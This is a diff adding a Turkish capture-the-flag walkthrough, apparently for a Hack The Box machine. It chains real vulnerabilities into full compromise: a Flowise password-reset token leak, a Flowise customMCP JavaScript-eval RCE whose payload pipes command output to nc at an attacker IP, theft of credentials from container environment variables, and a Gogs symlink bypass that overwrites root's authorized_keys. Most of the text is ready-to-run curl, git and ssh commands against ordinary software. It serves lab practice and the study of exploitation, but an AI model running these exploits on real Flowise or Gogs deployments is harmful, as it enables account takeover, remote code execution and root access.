@@ -1,0 +1,119 @@
+nmap taraması:
+
+    nmap -sC -sV -p- --min-rate 5000 *
+
+Açık portlar:
+  - 22/tcp  -> OpenSSH
+  - 80/tcp  -> nginx (virtual host yönlendirme)
+
+/etc/hosts'a eklenecekler:
+    silentium.htb
+    staging.silentium.htb
+    staging-v2-code.dev.silentium.htb
+
+Nginx üç sanal host çalıştırıyor:
+  - silentium.htb           → statik HTML site
+  - staging.silentium.htb   → Flowise 3.0.5 (AI workflow builder, port 3000)
+  - staging-v2-code.dev.silentium.htb → Gogs 0.13.3 (git server, port 3001, sadece localhost)
+
+
+[ CVE-2025-58434 - Flowise Password Reset Token Leak ]
+
+Flowise'in /api/v1/account/forgot-password endpoint'i unauthenticated
+ve kullanıcı nesnesini tempToken dahil tam olarak döndürüyor:
+
+    curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
+      -H "Content-Type: application/json" \
+      -d '{"user":{"email":"ben@silentium.htb"}}'
+
+    Yanıt: {"user":{"id":"...","credential":"$2a$05$...","tempToken":"jDJM6...", ...}}
+
+Bu token ile şifreyi sıfırlıyoruz:
+
+    curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
+      -H "Content-Type: application/json" \
+      -d '{"user":{"email":"ben@silentium.htb","tempToken":"jDJM6...","password":"Hacked123!"}}'
+
+
+[ CVE-2025-59528 - Flowise customMCP RCE ]
+
+Flowise'e giriş yapınca JWT token cookie'de geliyor (token field).
+SQLite veritabanındaki DefaultKey API key'i:
+
+    *
+
+Bu key'i "Authorization: Bearer" header'ı olarak kullanıyoruz.
+/api/v1/node-load-method/customMCP endpoint'inde mcpServerConfig
+parametresi JavaScript olarak eval ediliyor:
+
+    curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
+      -H "Authorization: Bearer *" \
+      -H "Content-Type: application/json" \
+      -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":
+          "({x:(()=>{process.mainModule.require(\"child_process\")
+          .exec(\"id | nc KALI_IP PORT\");return 1;})()\"}}"}'
+
+Docker container'da root shell alıyoruz (Alpine Linux).
+
+
+[ Credential Discovery ]
+
+Container env değişkenlerinden kritik bilgi:
+
+    FLOWISE_PASSWORD=*    (Flowise HTTP Basic Auth - SSH için yanlış)
+    SMTP_PASSWORD=*       (SSH şifresi!)
+
+/root/.flowise/database.sqlite'dan da:
+    Flowise encryption.key: *
+    DefaultKey: *
+
+
+[ User Flag ]
+
+Container'da env çıktısından bulunan SMTP_PASSWORD ile host SSH:
+
+    ssh ben@10.129.59.176
+    Şifre: *
+
+    cat /home/ben/user.txt
+    *
+
+
+[ Privilege Escalation - CVE-2025-8110 Gogs Symlink Bypass ]
+
+Gogs 0.13.3, 127.0.0.1:3001 üzerinde çalışıyor ve root olarak çalışıyor.
+SSH tüneli kuruyoruz:
+
+    ssh -fN -L 8080:127.0.0.1:3001 ben@ip
+
+Gogs kayıt captcha gerektiriyor ama CSRF+captcha ile kayıt olunabiliyor.
+Kayıt sonrası API token oluşturuyoruz:
+
+    curl -u "pwner:Pwner123!" -X POST http://127.0.0.1:8080/api/v1/users/pwner/tokens \
+      -H "Content-Type: application/json" -d '{"name":"exploit"}'
+
+    Token: *
+
+CVE-2025-8110 exploit adımları:
+
+1. Yerel git repo'da /root/.ssh/authorized_keys'e işaret eden sembolik link:
+
+    git init exploit_repo && cd exploit_repo
+    ln -sf /root/.ssh/authorized_keys link.txt
+    git add -A && git commit -m "symlink"
+    git push http://pwner:Pwner123!@127.0.0.1:8080/pwner/pwn.git master
+
+2. Gogs API'sine PutContents isteği:
+   (Gogs root olarak çalıştığından symlink'i takip edip hedef dosyaya yazıyor)
+
+    curl -X PUT http://127.0.0.1:8080/api/v1/repos/pwner/pwn/contents/link.txt \
+      -H "Authorization: token *" \
+      -H "Content-Type: application/json" \
+      -d '{"message":"update","content":"<base64_ssh_pub_key>","sha":"<blob_sha>"}'
+
+3. SSH as root:
+
+    ssh -i root_key root@ip
+
+    cat /root/root.txt
+    *
